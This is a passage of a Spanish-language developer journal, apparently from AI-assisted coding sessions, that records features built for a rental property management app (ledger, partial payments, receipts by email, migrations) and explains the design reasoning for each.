Implementé la modalidad `"split"` de punta a punta: schema de DB, formulario de contratos, APIs (cuenta corriente, ledger POST, conciliar, emit), componentes UI (LedgerTable con columna Destino, CobroPanel con desglose de dos destinatarios, AddManualChargeDialog con selector de beneficiario, EntryDetailDialog con override efímero), wiring en TenantTabCurrentAccount, y visual distinción en la cuenta del propietario.

En total 12 tasks con ciclo completo: implementación por subagente → spec review → code quality review → fix de issues → commit.

### Por qué lo hice así y no de otra forma
La clave de diseño fue el campo `beneficiario` en `tenant_ledger` en lugar de dos entradas separadas o un flag booleano. Esto permite que cada ítem lleve su destino natural (`"split"` para alquiler, `"propietario"` para punitorios, elegible para cargos manuales) y que el admin pueda overridearlo efímeramente sin cambiar el registro.

El `splitBreakdown` se persiste al emitir el recibo (no al crear la entrada) porque captura el estado real al momento del cobro, incluyendo cualquier override que el admin haya aplicado en esa sesión. Si el inquilino paga todo junto, hay un solo momento de verdad.

Usé el endpoint `/api/receipts/emit` (que ya tenía la transacción) para persistir `splitBreakdown` en vez de llamar al endpoint `/conciliar` por separado — una sola transacción, sin round-trips adicionales.

### Conceptos que aparecieron
- **Subagent-Driven Development**: cada task va a un subagente fresco (sin contexto de la sesión actual), con spec review + code quality review antes de marcar completo. Evita que el contexto del coordinador se contamine y detecta bugs antes de acumularlos.
- **Beneficiario efímero vs. persistido**: el override vive en estado React local; el `splitBreakdown` queda en DB solo al cobrar. Separación entre "qué querés hacer ahora" y "qué quedó registrado".
- **`db.select()` wildcard**: cuando no especificás columnas en Drizzle, devuelve todas — incluyendo las nuevas que agregaste. Por eso la API de propietarios ya devuelve `splitBreakdown` sin cambios.

### Preguntas para reflexionar
1. ¿Por qué es importante que el override sea efímero? ¿Qué pasaría si cambiara el `beneficiario` permanentemente en la entrada?
2. Si en el futuro quisieras que los punitorios también puedan ir a administración, ¿dónde cambiarías la lógica de auto-asignación?

### Qué debería anotar en Obsidian
- [ ] Patrón: estado efímero en componente + snapshot al persistir (override local → breakdown en DB)
- [ ] Decisión técnica: campo `beneficiario` en ledger vs. dos entradas separadas vs. flag booleano

---

## 2026-05-03 — Flags contables en cargo manual + dialog de detalle de movimientos

### Qué hice

Implementé dos features interconectadas en la cuenta corriente de inquilinos:

**Flags contables en el dialog de cargo manual:**
- Al abrir "Cargo manual", ahora aparecen tres switches: "Impacta liquidación del propietario", "Incluir en base de honorarios", "Impacta caja"
- Cuando cambiás el tipo de cargo (Gasto, Servicio, Bonificación, Descuento), los switches se auto-resetean a los defaults de ese tipo (definidos en `src/lib/ledger/flags.ts`)
- El componente vive en `src/components/ledger/add-manual-charge-dialog.tsx` — reutilizable desde cualquier módulo

**Dialog de detalle de movimiento:**
- Desde el `···` de cualquier fila de la tabla se puede abrir un dialog de detalle
- Si el movimiento es **manual** (`isAutoGenerated: false`): los campos son editables (descripción, monto, vencimiento, flags)
- Si es **auto-generado** (alquiler, punitorio, ajuste): los campos están deshabilitados, solo lectura
- El componente vive en `src/components/ledger/entry-detail-dialog.tsx` — también reutilizable

**Cambios estructurales:**
- La X de los punitorios desapareció — ahora todos usan el menú `···`
- `tenant-tab-current-account.tsx` perdió ~100 líneas: el dialog inline se reemplazó por los componentes compartidos
- La API PATCH ahora acepta los tres flags y tiene un guard que rechaza ediciones de campos contables en entradas auto-generadas

### Por qué lo hice así y no de otra forma

**Componentes en `src/components/ledger/` en lugar de en `tenants/`:** tanto la cuenta corriente de propietarios como la caja van a necesitar los mismos dialogs. Ponerlos en una carpeta compartida desde el principio evita copiar-pegar después. El costo fue casi nulo porque el componente acepta `onSave` como callback — el llamador provee la URL y la mutación, el componente solo maneja el formulario.

**`onSave` como callback genérico en lugar de hacer el fetch adentro:** si el componente supiera la URL, no podría reutilizarse en propietarios (que tiene un endpoint diferente). El callback invierte la responsabilidad: el componente dibuja el form, el padre decide qué hacer con los datos.

**Guard en la API además de deshabilitar campos en la UI:** la UI deshabilita los campos para auto-generados, pero si alguien llama a la API directamente podría modificarlos. El guard en el backend es la defensa real. La UI es solo comodidad.

**Auto-reset de flags al cambiar tipo:** los defaults no son arbitrarios — cada tipo tiene un significado contable distinto. Si el usuario cambia de "Gasto" a "Bonificación", los flags correctos son diferentes. Resetearlos automáticamente evita que queden valores inconsistentes sin que el usuario lo note.

### Conceptos que aparecieron

- **callback como prop (onSave):** en lugar de que un componente haga todo (formulario + llamada a la API), se divide la responsabilidad. El componente maneja el formulario; quien lo usa decide qué hacer al guardar. Es como un formulario en papel: el formulario no sabe a dónde se manda, solo recolecta la información.

- **isAutoGenerated guard (defensa en profundidad):** tener validación en la UI Y en la API es redundante a propósito. La UI evita errores del usuario. La API evita errores de programación (o llamadas directas). En contabilidad, los dos niveles son importantes.

- **subagent-driven development:** en lugar de escribir todo el código en una sola sesión larga, se despacha un agente fresco por cada tarea. Cada agente tiene contexto limpio, implementa, y después hay dos revisiones: una de spec (¿hizo lo que se pidió?) y una de calidad (¿está bien hecho?). Más lento por tarea individual, pero encuentra bugs que de otra manera pasarían desapercibidos (como el bug del monto que se multiplicaba por 100).

- **bug del monto × 100:** `entry.monto` llega de la DB como string `"12500.00"`. El código de parseo hacía `.replace(/\./g, "")` (borra todos los puntos) antes de convertir a número. Resultado: `"1250000"` en lugar de `12500`. La causa raíz fue que el parseo fue diseñado para input de texto donde el punto es separador de miles (formato argentino), pero el valor pre-cargado desde la DB ya usaba el punto como decimal. Fix: `parseFloat(entry.monto)` primero, después convertir a string limpio.

### Preguntas para reflexionar

1. ¿Por qué tiene sentido que el componente de dialog no sepa nada de la URL del endpoint? ¿Qué pasa si en el futuro querés usar el mismo dialog desde tres módulos distintos?
2. El guard de `isAutoGenerated` en la API rechaza ediciones de campos contables. ¿Por qué no simplemente confiar en que la UI no va a mandar esos campos?

### Qué debería anotar en Obsidian

- [ ] **Patrón: callback como prop para componentes reutilizables** (`tag: patron/pr`) — cómo separar el formulario de la lógica de guardado para poder reusar el mismo component en múltiples contextos
- [ ] **Bug: parseo de montos desde DB vs input del usuario** (`tag: bug/pr`) — diferencia entre `"12500.00"` como string de DB y `"12.500,00"` como input del usuario; cómo detectarlo y prevenirlo
- [ ] **Concepto: defensa en profundidad** (`tag: concepto/pr`) — validar tanto en frontend como en backend, por qué en contabilidad los dos niveles son importantes

---

## 2026-05-02 — Sistema de documentación del proyecto (decisiones, historial, pendientes)

### Qué hice

Armé un sistema de documentación vivo dentro del mismo repositorio:

- Creé la carpeta `docs/decisions/` con un archivo por módulo: `contabilidad.md`, `inquilinos.md`, `propietarios.md`, `contratos.md`, `usuarios-y-acceso.md`, `documentos.md`
- Escribí las dos primeras decisiones reales en `contabilidad.md`: la cancelación soft (confirmada) y la conciliación manual (postergada)
- Creé `HISTORIAL.md` para registrar las funcionalidades completadas
- Reorganicé `PENDIENTES.md`: cada ítem activo ahora linkea a su módulo de decisiones, los completados van al final con link a HISTORIAL, y hay una nueva sección `🔵 Backlog / Futuro` para ítems postergados
- Actualicé `CLAUDE.md` con una sección que explica el sistema entero
- Actualicé `CLAUDE.local.md` para que Claude arranque cada sesión leyendo PENDIENTES si no hay un tema específico

También evaluamos el ítem "marcar movimiento como ya cobrado" y decidimos postergarlo: el volumen de casos es bajo, el riesgo de estafa está disuadido por el contrato, y el valor real aparece cuando los inquilinos puedan subir comprobantes en la app — lo cual requiere el módulo de login primero.

### Por qué lo hice así y no de otra forma

**Un archivo por módulo en lugar de uno por decisión**: un archivo por decisión escala bien en equipos grandes pero es overhead para un proyecto de una persona. Agrupar por módulo hace que sea fácil encontrar el contexto de un área sin navegar docenas de archivos.

**Tres documentos separados (PENDIENTES / HISTORIAL / decisions)**: cada uno responde una pregunta distinta. PENDIENTES = qué hacer hoy. HISTORIAL = qué tiene el sistema ahora. Decisions = por qué fue construido así. Mezclarlos haría que ninguno sea útil.

**Links entre PENDIENTES y decisions**: en lugar de duplicar el contexto en dos lugares, el ítem de PENDIENTES apunta al archivo de decisiones. Un solo lugar para leer el detalle.

### Conceptos que aparecieron

- **ADR (Architecture Decision Record)**: documento que registra una decisión técnica — qué se decidió, por qué, qué alternativas se descartaron, cuándo revisarlo. No es una tarea ni un bug. Es memoria del proyecto.

- **Documentación viva**: documentación que vive dentro del repositorio, junto al código, y se actualiza a medida que el sistema cambia. Lo opuesto a una wiki externa que queda desactualizada.

- **Backlog**: lista de cosas que tienen valor pero no son urgentes ahora. No es la papelera — es un estante ordenado de ideas válidas esperando el momento correcto.

### Preguntas para reflexionar

1. ¿Cuál es la diferencia entre documentar *qué hace* el código y documentar *por qué se decidió* hacerlo así?
2. Si en 6 meses alguien nuevo entra al proyecto, ¿qué documento debería leer primero para entender el estado del sistema?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: ADR (Architecture Decision Record) — qué es, para qué sirve, cuándo usarlo
- [ ] **Decisión técnica**: por qué postergamos la conciliación manual hasta tener login de inquilinos

---

## 2026-05-02 — Cancelar movimiento pendiente desde la UI de cuenta corriente

### Qué hice

Implementé la funcionalidad de cancelar (soft cancel) movimientos pendientes desde la tabla de cuenta corriente del inquilino. El flujo completo:

- Se agrega una columna `cancellationReason` (texto nullable) a la tabla `tenant_ledger` en la base de datos
- El endpoint PATCH `/api/tenants/[id]/ledger/[entryId]` ahora acepta `cancellationReason` y, cuando se cancela un movimiento, también cancela automáticamente los punitorios hijos en la misma transacción de base de datos
- En la tabla de movimientos aparece un botón `...` (tres puntos) en las filas con estado cancelable (`pendiente`, `registrado`, `pago_parcial`, `pendiente_revision`)
- Al hacer click aparece un dialog que muestra descripción y monto del movimiento, con un campo de texto libre opcional para el motivo
- La fila desaparece de la vista al confirmar

### Por qué lo hice así y no de otra forma

**Soft cancel en lugar de borrado físico**: en contabilidad nunca se borran registros — se anulan. Así queda rastro de que existió, quién lo anuló y cuándo. Si hay empleados, podés auditar. Si mañana alguien pregunta por qué falta un cargo, lo podés rastrear.

**Transacción de base de datos para el cascade**: el alquiler padre y sus punitorios hijos se cancelan en una sola operación atómica. Si el servidor cae a la mitad, todo vuelve atrás automáticamente — no quedás con el padre cancelado y los hijos "fantasmas" todavía pendientes.

**Guard de `conciliado` en el cascade**: si por alguna razón un punitorio ya estaba cobrado (`conciliado`), el sistema lo saltea en lugar de forzar su cancelación. Un pago cobrado no se puede deshacer solo porque se anuló el cargo original.

**Dialog en el componente padre, botón en la tabla**: la tabla (`LedgerTable`) es un componente "tonto" — solo muestra datos y llama callbacks. El estado del dialog y la llamada a la API viven en el padre (`TenantTabCurrentAccount`), que ya tiene el contexto del inquilino. Es el mismo patrón que usan los otros dialogs del componente (emitir recibo, anular recibo, cargo manual).

**Subagentes para implementar**: usamos un sistema de agentes especializados — uno para cada tarea, con revisiones de spec y calidad entre medio. Esto permite que cada cambio sea pequeño y verificado antes de pasar al siguiente.

### Conceptos que aparecieron

- **Soft delete / soft cancel**: en lugar de borrar un registro de la base de datos, se marca con un estado especial (`cancelado`). El dato sigue existiendo pero queda "invisible" para el flujo normal. Es la práctica estándar en sistemas financieros.

- **Transacción de base de datos**: un bloque de operaciones que se ejecutan como una sola unidad. Si cualquiera falla, todas se deshacen. En Drizzle se usa `db.transaction(async (tx) => { ... })`.

- **Atomicidad**: la propiedad de que una operación es "todo o nada". Si actualizás dos tablas y la segunda falla, la primera vuelve atrás. Sin esto, los datos pueden quedar en un estado inconsistente.

- **Cascade**: cuando una acción sobre un registro "cae en cascada" hacia registros relacionados. Aquí, cancelar un alquiler cancela también sus punitorios.

- **Callback prop**: una función que se le pasa a un componente hijo como parámetro. El hijo la llama cuando algo pasa (el usuario hace click), pero no sabe qué hace — eso lo decide el padre.

- **Schema Zod**: una definición de la forma que debe tener un objeto en TypeScript. Sirve para validar los datos que llegan de afuera (el body de un request HTTP) antes de procesarlos.

### Preguntas para reflexionar

1. ¿Por qué es importante que la cancelación de padre e hijos ocurra en una sola transacción? ¿Qué pasaría si no lo fuera?
2. ¿Cuál es la diferencia entre un componente "tonto" y uno "inteligente"? ¿Por qué conviene que `LedgerTable` sea tonto?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Soft delete — qué es, por qué se usa en sistemas financieros, analogía con tachadura en un cuaderno contable
- [ ] **Concepto**: Transacción de base de datos — atomicidad, el ejemplo del banco que transfiere plata
- [ ] **Patrón**: Callback prop en React — cómo un componente hijo avisa al padre sin saber qué hace el padre con esa información
- [ ] **Decisión técnica**: Por qué elegimos soft cancel en lugar de borrado físico para los movimientos del ledger

---

## Sesión 2026-05-02 — Ledger start date + limpieza de PENDIENTES

### Qué hice

- Revisé PENDIENTES.md y descubrimos que sub-proyectos A (doble rol) y la auditoría visual ya estaban hechos — los marcamos y seguimos
- Implementé la feature "elegir desde qué mes generar el ledger" completa: schema (`ledgerStartDate` nullable en `contract`), APIs (POST/GET/PATCH), lógica (`buildLedgerEntries` usa `ledgerStartDate ?? startDate`), formulario (campo ámbar automático cuando `startDate > 30 días pasado`) y ficha del contrato (sección "Cobros del contrato" con botón Generar/Regenerar)
- Agregué soporte de regeneración forzada (`?force=true`) que borra solo entradas no cobradas antes de regenerar — con guard para evitar duplicados si todo está cobrado
- Detecté y corregí bug: el route `generate-ledger` buscaba el inquilino en la tabla vieja `contract_tenant` (roles "primary"/"co-tenant") en vez de la nueva `contractParticipant` (roles "owner"/"tenant"/"guarantor") — por eso devolvía 422
- Corregí un problema de UX: el botón "Generar cobros" ahora guarda `ledgerStartDate` automáticamente antes de generar, sin necesidad de un botón "Guardar" separado
- Eliminé el botón "Guardar" redundante de la sección de cobros
- Reorganicé PENDIENTES.md en grupos de prioridad (alta/media/baja) y eliminé los ítems ya hechos

### Por qué lo hice así y no de otra forma

**`ledgerStartDate` como campo en la DB en vez de parámetro del POST de generación**: podría haberse pasado como query param `?from=2026-03`, pero guardarlo en el contrato permite que quede visible en la ficha, que se pueda editar después, y que cualquier regeneración futura use el mismo punto de partida sin tener que volver a especificarlo.

**Guard "all cobrado" en la regeneración**: sin ese guard, llamar a `force=true` en un contrato con todos los movimientos cobrados insertaría filas duplicadas silenciosamente — no hay constraint único en `(contratoId, period, tipo)`. El guard devuelve 409 con mensaje claro antes de insertar.

**Guardar antes de generar en el cliente (no en el servidor)**: en vez de cambiar la firma del endpoint para aceptar `ledgerStartDate` en el body, hicimos un PATCH previo al POST. Más simple — cada endpoint sigue siendo responsable de una sola cosa.

**Migración a tabla nueva como deuda técnica, no hoy**: 14 archivos usan `contractTenant`. Migrarlos todos en la misma sesión era riesgoso — tocaría recibos, ledger, servicios, garantías. Lo más seguro fue anotar la deuda claramente en PENDIENTES con el contexto necesario.

### Conceptos que aparecieron

- **Tabla obsoleta (zombie table)**: una tabla que todavía existe en la DB y tiene referencias en el código, pero el sistema ya no escribe datos nuevos ahí. Detectamos esto porque `contract_tenant` nunca recibía filas desde la creación de contratos — la app nueva escribe en `contractParticipant`, pero los routes viejos seguían leyendo de la vieja.
- **Idempotencia**: propiedad de una operación que puede ejecutarse múltiples veces sin cambiar el resultado después de la primera ejecución. El botón "Generar cobros" no debería generar el doble si se presiona dos veces — el guard de 409 lo protege.
- **Nullish coalescing (`??`)**: operador de JavaScript que usa el valor de la derecha solo si el de la izquierda es `null` o `undefined`. Distinto de `||` que también descarta `0` y `""`.

### Preguntas para reflexionar

1. Si `contract_tenant` está en desuso pero 14 archivos la usan, ¿esos features están rotos para contratos creados con el sistema nuevo?
2. ¿Tiene sentido agregar un constraint único en `(contratoId, period, tipo)` en `tenant_ledger` para que la DB misma rechace duplicados?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Tabla zombie / tabla obsoleta — cómo detectarla y el riesgo de no migrarla
- [ ] **Bug**: 422 en generate-ledger — causa (tabla equivocada `contract_tenant` vs `contractParticipant`) y fix
- [ ] **Patrón**: Guardar campo antes de ejecutar acción en un solo click (save-then-act en el cliente)
- [ ] **Decisión técnica**: `ledgerStartDate` en DB vs parámetro del POST — por qué guardarlo en el contrato

---

## Sesión 2026-04-29 — Plantas y ambientes + formulario siempre editable

### Qué hice

- Agregué columna `floors` (integer, default 1) a la tabla `property` — cuántas plantas tiene el inmueble
- Agregué columna `floor` (integer, default 1) a `property_room` — a qué planta pertenece cada ambiente
- Generé la migración 0014 con Drizzle, pero fallaba porque incluía tablas (`contract_clause`, `contract_document_config`) que ya existían desde un `db:push` anterior
- Resolví aplicando los dos `ALTER TABLE` directamente con Neon MCP e insertando el hash SHA-256 de la migración en `drizzle.__drizzle_migrations` para que Drizzle la considere aplicada
- Actualicé los API routes de property y rooms para aceptar/devolver `floors` y `floor`
- Implementé agrupación de ambientes por planta con etiquetas automáticas: "Planta Baja", "Planta Alta" (si hay 2), "Primer Piso", "Segundo Piso"… (convención argentina)
- Eliminé el botón de "Editar datos" de la ficha: ahora siempre editable
- Agregué una barra sticky al pie de la sección de datos que muestra "Guardar cambios" / "Descartar" solo cuando hay cambios reales (`isDirty`)
- Corregí el bug de plantas huérfanas: cuando se reduce el número de plantas, los ambientes fuera de rango ahora se muestran en la última planta disponible (display: `Math.min`) y se actualizan en la DB al guardar (`Promise.all`)
- La sección de ambientes reacciona al número de plantas en tiempo real (usa `form.floors`, no el valor guardado) — no hay que guardar para ver la agrupación

### Por qué lo hice así y no de otra forma

**Migración manual con Neon MCP en vez de editar el archivo**: Drizzle genera un solo archivo con todos los cambios acumulados desde el último snapshot. Incluía tablas que ya existían (creadas con `db:push`), lo que rompía el `migrate`. En lugar de modificar el archivo generado (mala práctica que desincroniza snapshots), apliqué solo los dos `ALTER TABLE` nuevos directamente y registré la migración en la tabla de control con su hash real. El historial queda intacto.

**Siempre editable en vez de modo edición/vista**: el ciclo Editar → cambiar → Guardar es un obstáculo innecesario. El patrón `isDirty` + barra sticky reemplaza ese flujo: el usuario cambia lo que quiere y la barra aparece sola cuando hay algo para guardar. Si no cambió nada, el botón está deshabilitado y la barra tiene bajo contraste para no distraer.

**`Math.min(r.floor, totalFloors)` para el display**: cuando bajás de 4 a 3 plantas, el ambiente del piso 4 "baja" visualmente al piso 3. La alternativa de ocultarlo parece un borrado. Con `Math.min` se mantiene visible en la última planta disponible, que es la expectativa natural.

**`Promise.all` para actualizar rooms huérfanas**: en vez de patchear una por una en un loop, mandamos todas las actualizaciones en paralelo. Si hay 5 rooms en la planta eliminada, se resuelven todas al mismo tiempo.

**`useEffect` con `[activeTab, prop?.id, prop?.updatedAt]`**: el formulario se reinicializa en dos momentos concretos — cuando cargás la propiedad por primera vez y cuando `prop.updatedAt` cambia (post-guardado). Usar `prop?.updatedAt` como dependencia evita reinicializaciones innecesarias si cambia cualquier otra parte del objeto.

### Conceptos que aparecieron

- **`db:push` vs `db:migrate`**: `db:push` aplica el schema directamente a la DB sin dejar registro — ideal para desarrollo rápido. `db:migrate` aplica archivos de migración en orden y los registra en `drizzle.__drizzle_migrations`. Mezclarlos genera inconsistencias entre el estado real de la DB y el historial de Drizzle
- **Tabla de control de migraciones**: Drizzle guarda en `drizzle.__drizzle_migrations` un hash SHA-256 de cada archivo de migración aplicado. `db:migrate` compara ese registro contra los archivos en `drizzle/` y solo aplica los que faltan
- **`sticky` CSS**: posicionamiento que "pega" un elemento al borde visible cuando el usuario scrollea. A diferencia de `fixed`, el elemento sigue en el flujo del documento (no flota sobre todo). Solo se activa al llegar al borde especificado (`bottom-0`)
- **isDirty**: patrón que compara el estado actual del formulario con el estado guardado (snapshot). Si difieren, hay cambios pendientes. Se implementa calculándolo en cada render — aquí con `JSON.stringify` de ambos objetos
- **`Math.min` para clampear**: limitar un valor a un máximo. `Math.min(r.floor, totalFloors)` garantiza que ningún ambiente aparezca en una planta inexistente

### Preguntas para reflexionar

1. Si el usuario reduce plantas de 4 a 2 (y la DB actualiza todos los rooms huérfanos al piso 2) y después vuelve a 4, ¿qué pasa con los ambientes que estaban en pisos 3 y 4? ¿Es eso lo que esperaba?
2. ¿Hay algún caso en el que `JSON.stringify` no sea suficiente para comparar dos estados de formulario?

### Qué debería anotar en Obsidian

- [ ] **Bug**: Ambientes que desaparecen al reducir plantas — causa (filter exacto) y fix (`Math.min` en display + PATCH en DB)
- [ ] **Patrón**: Formulario siempre editable con barra sticky + isDirty
- [ ] **Concepto**: `db:push` vs `db:migrate` — qué pasa cuando se mezclan y cómo resolverlo

---

## Sesión 2026-04-28

### Qué hice

- Auditoría visual del wireframe `cuenta-corriente-tabla.html` contra la app real
- Confirmé que el mes actual ya estaba destacado (punto 3 del wireframe — ya implementado)
- Agregué footer de totales bajo el ledger: **Capital**, **Intereses**, **Pendientes**, **Registrados**
- Corregí overflow del badge "PAGO PARCIAL" ampliando columnas Estado (90→110px) y Acciones (60→90px)
- Pasé el equipo `arce-dev-team`: style-guard + language-guard sobre los archivos modificados
- Corregí todas las violaciones del design system: `[var(--token)]` → clases Tailwind, `<button>` nativo → `<Button>` shadcn, `rounded-xl` → `rounded-[var(--radius-lg)]`
- Renombré query key `"caja-movimientos"` → `"cash-movements"` en 2 archivos (violación alta de language-guard)

### Por qué lo hice así y no de otra forma

**Footer de totales fuera del LedgerTable**: el footer muestra el estado real completo del contrato, independiente de qué filtro esté activo. Si lo hubiera puesto adentro del componente de tabla, el número cambiaría al filtrar por "Pagados" o "Futuros", lo cual sería confuso. Afuera siempre refleja la realidad.

**Capital e Intereses = desglose de Pendientes**: los punitorios (`tipo === "punitorio"`) son intereses de mora. Todo lo demás es capital. Así Capital + Intereses = Pendientes siempre.

**Query keys en inglés**: las query keys son identificadores internos del sistema de caché de TanStack Query. Si dos componentes usan keys distintas para el mismo dato, uno invalida y el otro no se entera — bug silencioso. Por eso language-guard lo marca como severidad alta.

**`[var(--token)]` vs clase Tailwind**: en Tailwind v4 los tokens del design system están mapeados en `@theme inline`. Eso significa que existen clases directas como `text-warning`, `border-income`, etc. Usar `text-[var(--warning)]` es un bypass que no genera las variantes de hover ni dark mode correctamente, y rompe la consistencia del sistema.

### Conceptos que aparecieron

- **gitignore**: le dice a Git qué archivos ignorar — no los borra, solo los excluye del tracking. Los archivos igualmente viven en tu computadora.
- **query key**: identificador único que TanStack Query usa para cachear y sincronizar datos entre componentes. Si dos componentes usan la misma key, comparten caché y se invalidan juntos.
- **design token**: variable CSS que representa un valor semántico del sistema visual (color, radio, tipografía). Usarlos directamente (en vez de valores hardcodeados) garantiza consistencia y permite cambiar el tema desde un solo lugar.
- **severidad alta en language-guard**: solo se activa para query keys en español, porque generan bugs silenciosos de sincronización de caché.

### Preguntas para reflexionar

1. ¿Por qué conviene que Capital + Intereses = Pendientes en vez de mostrarlos como totales independientes?
2. Si un componente invalida `"cash-movements"` y otro escucha `"caja-movimientos"`, ¿qué pasa en la UI cuando se emite un recibo?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Query keys en TanStack Query — qué son, por qué deben estar en inglés, qué pasa si dos keys nombran el mismo recurso distinto
- [ ] **Bug**: `[var(--token)]` vs clase Tailwind — por qué bypasear el sistema de tokens rompe hover/dark mode
- [ ] **Patrón**: Footer de totales fuera del componente de tabla — separar resumen global de vista filtrada

---

## Sesión 2026-04-27 — Envío de recibos por email

### Qué hice

- Configuré Resend como servicio de envío de emails (cuenta gratuita)
- Corregí un conflicto de rutas en Next.js: `[reciboNumero]` y `[id]` coexistían en el mismo nivel bajo `/api/receipts/`, lo que rompía el servidor. Lo resolví renombrando la carpeta a `[id]` y ajustando el parámetro dentro del código
- Guié la configuración de dominio en Resend con `latellafrias.com.ar`, que usa Cloudflare como DNS (pendiente de acceso a Cloudflare para cargar los registros)
- Mejoré el manejo de errores en el cliente para que los mensajes de Resend sean legibles en lugar de explotar con "invalid JSON"

### Por qué lo hice así y no de otra forma

**Conflicto de rutas**: Next.js trata los segmentos dinámicos como patrones — si en el mismo nivel tenés `[id]` y `[reciboNumero]`, no sabe cuál usar y tira error al arrancar. La solución es que todos los segmentos dinámicos del mismo nivel usen el mismo nombre. Es como tener dos cajones numerados con etiquetas distintas: el armario se confunde. La solución es ponerles la misma etiqueta y distinguirlos por el contenido adentro.

**Resend en lugar de Gmail SMTP**: Gmail SMTP tiene límites bajos (500/día) y los términos de Google prohíben usarlo para envíos de negocio. Resend es un servicio diseñado para emails transaccionales (recibos, confirmaciones), tiene plan gratuito real y escala bien.

**Dominio propio vs. email verificado**: Resend en modo test solo permite mandar al email registrado en la cuenta. Para mandar a clientes reales (inquilinos) necesitás un dominio verificado. Es una medida antispam: cualquiera podría registrarse y spamear si no hubiera esta restricción.

### Conceptos que aparecieron

- **DNS**: sistema que traduce nombres de dominio (`latellafrias.com.ar`) a direcciones técnicas. Es como una guía telefónica de internet. Cloudflare y NIC.ar son "el local donde está guardada esa guía" — si el dominio apunta a Cloudflare, los cambios hay que hacerlos ahí.
- **Registros DNS (TXT, MX, DKIM, SPF)**: instrucciones que le dicen a internet cómo manejar los emails de un dominio. TXT verifica que el dominio te pertenece, MX dice adónde van los rebotes, SPF y DKIM prueban que el email no es spam.
- **Nameservers / Delegaciones**: le dicen a NIC.ar "el DNS de este dominio lo maneja Cloudflare". Por eso los cambios DNS hay que hacerlos en Cloudflare, no en NIC.ar.
- **Email transaccional vs. masivo**: los recibos son "transaccionales" (uno por evento, para una persona específica). Distinto del email masivo (newsletters). Resend está diseñado para el primero.
- **`Promise.allSettled`**: manda emails a todos los destinatarios en paralelo y reporta cuáles fallaron sin cancelar los demás. Como mandar cartas por correo: si una se pierde, las otras llegan igual.

### Preguntas para reflexionar

1. ¿Qué pasa si el inquilino tiene varios emails y uno falla? ¿Le mostramos el error parcial o lo ocultamos?
2. ¿Tiene sentido guardar un registro de "recibo enviado por email" en la base de datos para auditoría?

### Qué debería anotar en Obsidian

- [ ] Concepto: DNS y registros (TXT, MX, SPF, DKIM) — qué son y para qué sirve cada uno
- [ ] Decisión técnica: por qué Resend en lugar de Gmail SMTP para emails transaccionales
- [ ] Bug: conflicto de rutas dinámicas en Next.js (`[id]` vs `[reciboNumero]` en el mismo nivel)

---

## Sesión 2026-04-26 — Pagos parciales

### Qué hice

Implementé el sistema completo de pagos parciales en la cuenta corriente del inquilino, de punta a punta.

1. **Diseño y spec primero** — Antes de tocar código, pasamos por brainstorming y documentamos las reglas de negocio: punitorios se cobran antes que capital, el saldo restante "reinicia el reloj" de punitorios, el monto original nunca se modifica, los pagos se acumulan.

2. **Schema: dos columnas nuevas** en `tenant_ledger`:
   - `montoPagado` — acumulado cobrado hasta ahora (null si nunca hubo pago parcial)
   - `ultimoPagoAt` — fecha del último pago, nuevo "día 0" para calcular mora sobre el saldo restante
   - Nuevo estado `"pago_parcial"` en el campo `estado`

3. **UI del ledger** — El toggle "Pago parcial" aparece automáticamente cuando el staff edita el monto a menos del original. Muestra el saldo que quedaría pendiente. Post-recibo, la fila muestra badge ámbar con el detalle "Original: $X · Pagado: $Y" y el saldo restante en grande.

4. **Popover de punitorio actualizado** — Ya recibía `montoPagado` y `ultimoPagoAt` como props. Ahora calcula sobre el saldo restante y usa `ultimoPagoAt` como punto de inicio en vez del `dueDate` original.

5. **Endpoint de emisión de recibo** — Acepta `montoOverrides` (un mapa de id → monto). Por cada entrada, acumula `montoPagado` y actualiza `ultimoPagoAt`. Si `montoPagado >= monto` original → `"conciliado"`. Si no → `"pago_parcial"`. También valida que no se envíen montos negativos o cero.

6. **Ruta de cuenta corriente** — La query de alquileres vencidos ahora incluye `"pago_parcial"` además de `"pendiente"`. Los punitorios automáticos se calculan sobre el saldo restante desde `ultimoPagoAt`. El KPI "Capital en mora" muestra el saldo restante, no el monto original.

7. **Bug en `getMonto` descubierto en review final** — La función que calcula el total del recibo usaba `entry.monto` (monto original) en vez del saldo restante para entradas `pago_parcial`. Sin este fix, al seleccionar una entrada parcialmente pagada sin modificar el monto, el recibo hubiera cobrado el valor completo original. Se detectó y corrigió antes de hacer el PR.

### Por qué lo hice así y no de otra forma

- **`monto` original nunca se modifica** — es el dato del contrato. Si lo pisáramos con cada pago, perderíamos el historial. En cambio guardamos el acumulado cobrado (`montoPagado`) y siempre calculamos el saldo como `monto - montoPagado`. Así se puede reconstruir la historia.

- **`ultimoPagoAt` como texto `YYYY-MM-DD`** — consistente con todos los demás campos de fecha del proyecto. No usamos timestamp porque la granularidad de día es suficiente para mora, y simplifica la visualización.

- **Toggle solo aparece si override < saldo restante** — no si es menor al monto original. Esto es importante para el segundo pago parcial: si quedan $40.000 y el staff ingresa exactamente $40.000 (saldo completo), no debe marcarse como parcial aunque sea menos que el original de $100.000.

- **Validación de cero/negativo en el backend** — no solo en UI. La UI puede tener bugs; la API es el último guardián.

- **Side-effect en GET para punitorios automáticos** — igual que en la sesión anterior. La alternativa sería un cron job o un endpoint separado de sincronización, pero para este caso el GET con side-effect es lo más simple que funciona.

### Conceptos que aparecieron

- **Estado derivado vs. almacenado**: `saldoRestante` nunca se guarda en la DB — siempre se calcula como `monto - montoPagado`. Solo se almacena el mínimo necesario. Guardar el saldo en vez del acumulado sería un error: si alguna vez hay un bug y el dato queda mal, no podés reconstruirlo.
- **Acumulador vs. snapshot**: `montoPagado` es un acumulador (va sumando pagos). La alternativa sería guardar cada pago individual en una tabla de historial. Para V1 el acumulador es suficiente y más simple.
- **Inmutabilidad del dato de origen**: el `monto` del contrato es un hecho del pasado que no debe cambiar. Si el inquilino paga de a partes, ese hecho se registra aparte, no se modifica el original.
- **Review de punta a punta**: además del review por tarea (spec + calidad), hicimos un review end-to-end de todo el feature junto. Fue ahí donde apareció el bug de `getMonto`. Los reviews por tarea no lo hubieran detectado porque ese bug surgía de la interacción entre dos archivos distintos.

### Preguntas para reflexionar

1. ¿Por qué el campo `monto` original nunca debe modificarse? ¿Qué se rompería si lo pisáramos con el saldo restante después de cada pago?
2. ¿Cuál es la diferencia entre guardar el acumulado (`montoPagado`) versus guardar cada pago individual? ¿En qué caso conviene cada uno?

### Qué debería anotar en Obsidian

